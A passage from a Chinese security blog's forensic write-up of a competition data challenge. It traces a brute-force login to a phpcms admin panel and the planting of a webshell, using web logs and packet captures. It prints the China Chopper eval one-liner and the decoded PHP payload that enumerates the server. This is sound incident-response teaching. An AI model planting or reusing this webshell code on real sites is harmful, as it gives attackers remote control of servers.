      <category term="取证" scheme="http://www.daikersec.com/categories/%E5%8F%96%E8%AF%81/"/>
    
      <category term="流量分析" scheme="http://www.daikersec.com/categories/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="wireshark" scheme="http://www.daikersec.com/tags/wireshark/"/>
    
      <category term="数据分析" scheme="http://www.daikersec.com/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
    
      <category term="取证" scheme="http://www.daikersec.com/tags/%E5%8F%96%E8%AF%81/"/>
    
      <category term="日志分析" scheme="http://www.daikersec.com/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
      <category term="流量分析" scheme="http://www.daikersec.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>铁人三项数据赛样题分析</title>
    <link href="http://www.daikersec.com/wiki/3c7f43ba.html"/>
    <id>http://www.daikersec.com/wiki/3c7f43ba.html</id>
    <published>2018-04-22T14:30:02.000Z</published>
    <updated>2018-05-21T03:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><p>下载链接: <a href="https://pan.baidu.com/s/1bq9Zvun" target="_blank" rel="noopener">数据赛 密码：wabt  解压密码：t3sectimu</a><br>题目要求:<br>背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。<br>问题：</p><p>（1）黑客最终获得了什么用户名<br>（2）黑客最终获得了什么密码<br>（3）黑客修改了什么文件<br>（4）黑客使用菜刀的完整连接地址<br>（5）黑客使用菜刀的连接密码<br>(6)黑客的查看的第一个文件目录是什么<br><a id="more"></a></p><h2 id="0x01-初步分析攻击者IP"><a href="#0x01-初步分析攻击者IP" class="headerlink" title="0x01 初步分析攻击者IP"></a>0x01 初步分析攻击者IP</h2><p>我们在假定攻击者攻击成功的情况下，应该会留下网页木马，先看下最后一个被访问的那些链接，这里通过<code>Web Log Explorer</code>的<code>Exit Point</code>查看<br><img src="https://upload-images.jianshu.io/upload_images/5443560-48d9b8b43b9db3a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Exit Point"><br>这里看到三个比较可疑的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tunnel.php</span><br><span class="line">backdoor.php</span><br><span class="line">y0n.php</span><br></pre></td></tr></table></figure><p>然后看三个中最早的具体保文，可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.61.210 (LOCAL NETWORK)   2016/8/10 1:16:07   /y0n.php            200 - OK    No Referrer</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.61.210 (LOCAL NETWORK)   2016/8/10 1:15:38   /backdoor.php           200 - OK    No Referrer</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.36.79.67 (Beijing,Beijing,China)    2016/8/10 1:03:07   /tunnel.php     28  200 - OK    No Referrer</span><br></pre></td></tr></table></figure><p>这里面的/tunnel.php，如果我们做过内网渗透的时候应该都知道，这个是一个HTTP代理，我们又注意到<code>backdoor.php</code>和<code>y0n.php</code>的访问IP都是内网，再看下访问时间，可以推出攻击者是通过tunnul代理进来的。攻击者IP大致可以确定是<code>101.36.79.67</code>。现在已经的最早攻击成功时间是<code>2016/8/10 1:03:07</code>.这个情况下分析下<code>101.36.79.67</code>这个IP的访问记录。我们通过<code>Apache Logs Viewer</code>来过滤IP。分析攻击过程<img src="https://upload-images.jianshu.io/upload_images/5443560-8c96560e500388bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="访问情况.png"><br>这里面没发现有啥能getshell的操作。<br>这条思路断了。</p><h2 id="0x02-再分析攻击者IP"><a href="#0x02-再分析攻击者IP" class="headerlink" title="0x02 再分析攻击者IP"></a>0x02 再分析攻击者IP</h2><p>接下来通过单个页面的点击情况来分析(正常首页那种情况访问量应该多，，后台的访问应该比较少)<br><img src="https://upload-images.jianshu.io/upload_images/5443560-16cba6bf852c872c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="点击情况.png"><br>然后这里陷入一个惯性思维，，以为index.php一定是首页。点进去才看到<code>index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=xFbuB1</code>这样的链接，想起来这是用<code>MVC</code>书写的时候的链接上次。点进<code>index.php</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-5ee3414ee6efc313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="后台.png"><br>这里发现大量对后台进行访问，，初步推测可能在爆破账号密码。对IP进行过滤，排除掉内网IP，得到<code>219.239.105.18</code>这个IP</p><h2 id="0x03-分析攻击过程"><a href="#0x03-分析攻击过程" class="headerlink" title="0x03 分析攻击过程"></a>0x03 分析攻击过程</h2><p>我们通过<code>Apache Logs Viewer</code>来过滤IP<br><img src="https://upload-images.jianshu.io/upload_images/5443560-fcf0ea076111ce51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆破.png"><br>我们分析该IP大约从2016/8/9 22:17分开始进行爆破(后台，发送大量POST包可以推断出来)，然后我们往后看<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8f4ee70a317bd267.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="成功.png"><br>大约在 2016/8/9 23:02 爆破成功<br>接下来我们看到<br><img src="https://upload-images.jianshu.io/upload_images/5443560-44eef6cf318db78d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="edit.png"><br>这里使用模板的editFile,修改的search 的index.html。<br>然后后面通过POST访问search这个，模块，，初步推测，，这里是种马和访问马的过程。这里单纯看日志有个不好的地方，，就是看不到POST的body里面的内容，这个时候就得结合流量包。</p><h2 id="0x04-分析攻击流量"><a href="#0x04-分析攻击流量" class="headerlink" title="0x04 分析攻击流量"></a>0x04 分析攻击流量</h2><p>我们通过流量包来验证上面日志的分析</p><h4 id="分析爆破出来的账号密码"><a href="#分析爆破出来的账号密码" class="headerlink" title="分析爆破出来的账号密码"></a>分析爆破出来的账号密码</h4><p>如果直接用wireshark一个个打开，太大了。这里推荐个软件 httppcap 专门用来提取http数据包的。总共有8个流量包，，如果一个个分析的话太繁琐，我们先大约估计爆破的在哪几个包里面。<br>通过一下shell脚本，提取每个包里面来自<code>219.239.105.18</code>的http请求头部<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for file in `ls`</span><br><span class="line">do</span><br><span class="line">    parse-pcap -i 219.239.105.18 $file &gt;&gt; txt/$file.txt</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>然后匹配哪些包里面含有<code>m=index</code>这样的请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for file in `ls`</span><br><span class="line">do</span><br><span class="line">    echo $file</span><br><span class="line">    cat $file|grep &apos;/index.php?m=admin&apos; </span><br><span class="line">    echo &quot;-----------------------------------------------------&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>得到爆破的流量都在<code>数据采集D_eth0_NS_20160810_130801.pcap</code>这个文件里面<br>接下来使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse-pcap -i 219.239.105.18 -vvv 数据采集D_eth0_NS_20160810_130801.pcap &gt; txt/all.txt</span><br></pre></td></tr></table></figure></p><p>来查看所有的爆破时候的http具体报文<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c64aa09ab58193f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆破报文.png"><br>如图,爆破的数据包在里面，，接下来寻找爆破成功的那个<br>根据发包时间和回包大小我们确实了登录成功的账号为<code>root</code>，密码为<code>123456</code>。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-2ac5a6358ca9286d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="深度截图_选择区域_20180417222225.png"></p><h4 id="0x02-分析一句话"><a href="#0x02-分析一句话" class="headerlink" title="0x02 分析一句话"></a>0x02 分析一句话</h4><p>通过上面方法匹配<code>m=search</code>,得到报文在<br><code>数据采集D_eth0_NS_20160810_141903.pcap</code>,<code>数据采集D_eth0_NS_20160810_142037.pcap</code>,<code>数据采集D_eth0_NS_20160810_142224.pcap</code>里面<br>然后提取报文详情<br><img src="https://upload-images.jianshu.io/upload_images/5443560-ff94f72c1e380db7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="yijuhua.png"><br>熟悉的一句话,urldecode一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure><p>密码为chooper</p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-3d8671f934c615cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="深度截图_选择区域_20180417223950.png"><br>第一个目录是/var/www/html</p><h4 id="0x03-一句话操作分析"><a href="#0x03-一句话操作分析" class="headerlink" title="0x03 一句话操作分析"></a>0x03 一句话操作分析</h4><p>总共有15个一句话操作<br>第一个解码完就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"-&gt;|"</span>);</span><br><span class="line">$D = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line"><span class="keyword">if</span> ($D == <span class="string">""</span>) $D = dirname($_SERVER[<span class="string">"PATH_TRANSLATED"</span>]);</span><br><span class="line">$R = <span class="string">"&#123;$D&#125;\t"</span>;<span class="keyword">if</span> (substr($D, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">"/"</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (range(<span class="string">"A"</span>, <span class="string">"Z"</span>) <span class="keyword">as</span> $L)</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="string">"&#123;$L&#125;:"</span>))</span><br><span class="line">            $R .= <span class="string">"&#123;$L&#125;:"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$R .= <span class="string">"\t"</span>;</span><br><span class="line">$u = (function_exists(<span class="string">'posix_getegid'</span>)) ? @posix_getpwuid(@posix_geteuid()) : <span class="string">''</span>;$usr = ($u) ? $u[<span class="string">'name'</span>] : @get_current_user();$R .= php_uname();$R .= <span class="string">"(&#123;$usr&#125;)"</span>;<span class="keyword">print</span> $R;;<span class="keyword">echo</span>(<span class="string">"|&lt;-"</span>);<span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个脚本的作用是获取网页所在的绝对路径<br>接下来依次分析，分别是<br>查看 /var/www/html 目录底下的文件内容<br>有这些</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">caches/ 2016-08-04 10:40:44 4096    0777</span><br><span class="line">uploadfile/ 2016-08-04 11:01:20 4096    0777</span><br><span class="line">statics/    2016-08-04 10:38:16 4096    0777</span><br><span class="line">api/    2016-08-04 10:38:16 4096    0777</span><br><span class="line">../ 2016-08-04 10:37:16 4096    0755</span><br><span class="line">phpsso_server/  2016-08-04 10:38:16 4096    0777</span><br><span class="line">html/   2016-08-04 10:46:37 4096    0777</span><br><span class="line">./  2016-08-04 10:39:54 4096    0777</span><br><span class="line">phpcms/ 2016-08-04 10:38:16 4096    0777</span><br><span class="line">plugin.php  2016-08-04 10:38:16 3573    0777</span><br><span class="line">index.html  2016-08-04 11:55:19 17588   0777</span><br><span class="line">crossdomain.xml 2016-08-04 10:38:16 104 0777</span><br><span class="line">robots.txt  2016-08-04 10:38:16 170 0777</span><br><span class="line">admin.php   2016-08-04 10:38:16 48  0777</span><br><span class="line">api.php 2016-08-04 10:38:16 595 0777</span><br><span class="line">index.php   2016-08-04 10:38:16 318 0777</span><br><span class="line">js.html 2016-08-04 10:38:16 523 0777</span><br><span class="line">favicon.ico 2016-08-04 10:38:16 3158    0777</span><br></pre></td></tr></table></figure><p>接下来查看的是根目录底下的文件夹,有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var/    2016-07-22 19:50:16 4096    0755</span><br><span class="line">selinux/    2016-07-16 00:59:51 0   0755</span><br><span class="line">lib/    2016-07-11 23:51:40 4096    0555</span><br><span class="line">dev/    2016-07-16 01:01:30 3740    0755</span><br><span class="line">media/  2016-07-12 00:18:35 4096    0755</span><br><span class="line">usr/    2016-07-11 23:46:08 4096    0755</span><br><span class="line">tmp/    2016-08-09 18:16:02 4096    1777</span><br><span class="line">etc/    2016-08-09 18:16:11 12288   0755</span><br><span class="line">proc/   2016-07-16 00:59:50 0   0555</span><br><span class="line">bin/    2016-07-16 02:18:03 4096    0555</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">home/   2016-08-04 10:23:14 4096    0755</span><br><span class="line">srv/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">opt/    2016-07-12 00:03:18 4096    0755</span><br><span class="line">sbin/   2016-07-16 02:18:04 12288   0555</span><br><span class="line">data1/  2016-07-12 00:11:00 4096    0755</span><br><span class="line">./  2016-07-16 01:00:10 4096    0555</span><br><span class="line">mnt/    2016-07-12 00:01:13 4096    0755</span><br><span class="line">sys/    2016-07-16 00:59:50 0   0755</span><br><span class="line">lib64/  2016-07-16 02:17:51 12288   0555</span><br><span class="line">boot    1970-01-01 08:00:00     0</span><br><span class="line">root    1970-01-01 08:00:00     0</span><br><span class="line">.autofsck   2016-07-16 01:00:10 0   0644</span><br><span class="line">lost+found  1970-01-01 08:00:00     0</span><br></pre></td></tr></table></figure><p>接下来查看<code>/etc/</code>底下的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line">./  2016-08-09 18:16:11 12288   0755</span><br><span class="line">../ 2016-07-16 01:00:10 4096    0555</span><br><span class="line">rc4.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">pulse/  2016-07-12 00:01:49 4096    0755</span><br><span class="line">skel/   2016-07-11 23:50:01 4096    0755</span><br><span class="line">bash_completion.d/  2016-07-11 23:55:24 4096    0755</span><br><span class="line">samba/  2016-07-11 23:51:59 4096    0755</span><br><span class="line">pango/  2016-07-11 23:49:07 4096    0755</span><br><span class="line">cron.hourly/    2016-07-11 23:51:58 4096    0755</span><br><span class="line">foomatic/   2016-07-11 23:53:35 4096    0755</span><br><span class="line">rwtab.d/    2013-11-23 05:20:24 4096    0755</span><br><span class="line">chkconfig.d/    2013-09-23 17:07:36 4096    0755</span><br><span class="line">obex-data-server/   2016-07-11 23:49:42 4096    0755</span><br><span class="line">wpa_supplicant/ 2016-07-11 23:48:32 4096    0755</span><br><span class="line">vmware-tools/   2016-07-12 00:03:14 4096    0755</span><br><span class="line">logrotate.d/    2016-07-16 02:41:56 4096    0755</span><br><span class="line">gnome-vfs-2.0/  2016-07-11 23:48:27 4096    0755</span><br><span class="line">terminfo/   2010-08-18 23:41:41 4096    0755</span><br><span class="line">xdg/    2016-07-11 23:50:13 4096    0755</span><br><span class="line">alternatives/   2016-07-11 23:52:04 4096    0755</span><br><span class="line">hal/    2016-07-11 23:50:59 4096    0755</span><br><span class="line">setuptool.d/    2016-07-11 23:51:14 4096    0755</span><br><span class="line">init.d/ 2016-08-01 11:01:39 4096    0755</span><br><span class="line">cups/   2016-07-11 23:54:38 4096    0755</span><br><span class="line">makedev.d/  2016-07-11 23:47:34 4096    0755</span><br><span class="line">ntp/    2016-07-11 23:51:44 4096    0755</span><br><span class="line">abrt/   2016-07-11 23:48:54 4096    0755</span><br><span class="line">pm/ 2016-07-11 23:46:08 4096    0755</span><br><span class="line">rc.d/   2016-07-12 00:03:18 4096    0755</span><br><span class="line">httpd/  2016-07-16 02:12:59 4096    0755</span><br><span class="line">gdm/    2016-07-11 23:51:13 4096    0755</span><br><span class="line">gtk-2.0/    2016-07-11 :50:01   4096    0755</span><br><span class="line">ssl/    2016-07-11 23:47:27 4096    0755</span><br><span class="line">libreport/  2016-07-11 23:48:53 4096    0755</span><br><span class="line">gcrypt/ 2013-10-24 23:38:14 4096    0755</span><br><span class="line">sound/  2016-07-11 23:50:01 4096    0755</span><br><span class="line">rc1.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">yum.repos.d/    2016-07-11 23:50:16 4096    0755</span><br><span class="line">default/    2016-07-11 23:46:45 4096    0755</span><br><span class="line">dracut.conf.d/  2016-07-12 00:01:52 4096    0755</span><br><span class="line">rpm/    2016-07-16 02:33:57 4096    0755</span><br><span class="line">php.d/  2016-07-16 02:33:56 4096    0755</span><br><span class="line">avahi/  2016-07-11 23:48:23 4096    0755</span><br><span class="line">openldap/   2016-07-11 23:58:43 4096    0755</span><br><span class="line">sudoers.d/  2013-11-22 20:51:12 4096    0750</span><br><span class="line">festival/   2016-07-11 23:50:10 4096    0755</span><br><span class="line">kdump-adv-conf/ 2016-07-11 23:54:24 4096    0755</span><br><span class="line">rsyslog.d/  2013-11-22 23:15:59 4096    0755</span><br><span class="line">depmod.d/   2016-07-11 23:48:04 4096    0755</span><br><span class="line">PackageKit/ 2016-07-11 23:50:14 4096    0755</span><br><span class="line">snmp/   2016-08-01 11:03:14 4096    0755</span><br><span class="line">profile.d/  2016-07-11 23:54:40 4096    0755</span><br><span class="line">dnsmasq.d/  2013-02-22 12:40:04 4096    0755</span><br><span class="line">pam.d/  2016-07-12 00:00:58 4096    0755</span><br><span class="line">rc6.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">sgml/   2016-07-11 23:48:11 4096    0755</span><br><span class="line">plymouth/   2016-07-11 23:50:30 4096    0755</span><br><span class="line">cron.weekly/    2011-09-27 09:33:08 4096    0755</span><br><span class="line">sane.d/ 2016-07-11 23:51:40 4096    0755</span><br><span class="line">pear/   2016-05-11 06:42:17 4096    0755</span><br><span class="line">ppp/    2016-07-11 23:50:19 4096    0755</span><br><span class="line">event.d/    2016-07-11 23:48:06 4096    0755</span><br><span class="line">popt.d/ 2010-08-21 13:30:56 4096    0755</span><br><span class="line">pcmcia/ 2016-07-11 23:52:27 4096    0755</span><br><span class="line">rc0.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">sysconfig/  2016-08-01 11:01:39 4096    0755</span><br><span class="line">lvm/    2016-07-11 23:54:01 4096    0755</span><br><span class="line">bonobo-activation/  2016-07-11 23:47:18 4096    0755</span><br><span class="line">audisp/ 2016-07-113:54:43   4096    0750</span><br><span class="line">opt/    2011-09-23 19:50:20 4096    0755</span><br><span class="line">polkit-1/   2016-07-11 23:48:05 4096    0755</span><br><span class="line">prelink.conf.d/ 2016-07-12 00:00:53 4096    0755</span><br><span class="line">gnupg/  2013-10-24 23:38:54 4096    0755</span><br><span class="line">ghostscript/    2016-07-11 23:49:01 4096    0755</span><br><span class="line">ld.so.conf.d/   2016-07-16 01:49:50 4096    0755</span><br><span class="line">rc2.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">iproute2/   2016-07-11 23:50:18 4096    0755</span><br><span class="line">udev/   2016-07-11 23:50:21 4096    0755</span><br><span class="line">init/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">cron.daily/ 2016-07-11 23:55:23 4096    0755</span><br><span class="line">acpi/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">rc3.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">postfix/    2016-07-11 23:51:54 4096    0755</span><br><span class="line">X11/    2016-07-11 23:51:00 4096    0755</span><br><span class="line">ssh/    2016-07-12 00:00:35 4096    0755</span><br><span class="line">cron.monthly/   2016-07-11 23:54:28 4096    0755</span><br><span class="line">blkid/  2013-11-22 23:29:33 4096    0755</span><br><span class="line">security/   2016-07-11 23:51:58 4096    0755</span><br><span class="line">scl/    2016-07-11 23:55:24 4096    0755</span><br><span class="line">alsa/   2016-07-11 23:52:26 4096    0755</span><br><span class="line">gconf/  2016-07-11 23:48:20 4096    0755</span><br><span class="line">statetab.d/ 2013-11-23 05:20:24 4096    0755</span><br><span class="line">pkcs11/ 2016-07-11 23:47:16 4096    0755</span><br><span class="line">dbus-1/ 2016-07-11 23:47:00 4096    0755</span><br><span class="line">sasl2/  2016-07-11 23:51:54 4096    0755</span><br><span class="line">hp/ 2016-07-11 23:51:40 4096    0755</span><br><span class="line">pki/    2016-07-11 23:51:43 4096    0755</span><br><span class="line">fonts/  2016-07-11 23:47:58 4096    0755</span><br><span class="line">ConsoleKit/ 2016-07-11 23:48:06 4096    0755</span><br><span class="line">xml/    2016-07-11 23:46:06 4096    0755</span><br><span class="line">dhcp/   2013-11-22 22:30:00 4096    0750</span><br><span class="line">rc5.d/  2016-08-01 11:01:41 4096    0755</span><br><span class="line">xinetd.d/   2016-07-11 23:55:23 4096    0755</span><br><span class="line">vmware-caf/ 2016-07-12 00:00:57 4096    0755</span><br><span class="line">yum/    2016-07-11 23:48:52 4096    0755</span><br><span class="line">hosts.deny  2010-01-12 21:28:22 460 0644</span><br><span class="line">statetab    20131-23 05:20:24   212 0644</span><br><span class="line">networks    2013-11-23 05:20:24 58  0644</span><br><span class="line">motd    2010-01-12 21:28:22 0   0644</span><br><span class="line">ntp.conf    2013-07-15 17:18:47 1778    0644</span><br><span class="line">at.deny 2012-01-30 21:56:34 1   0644</span><br><span 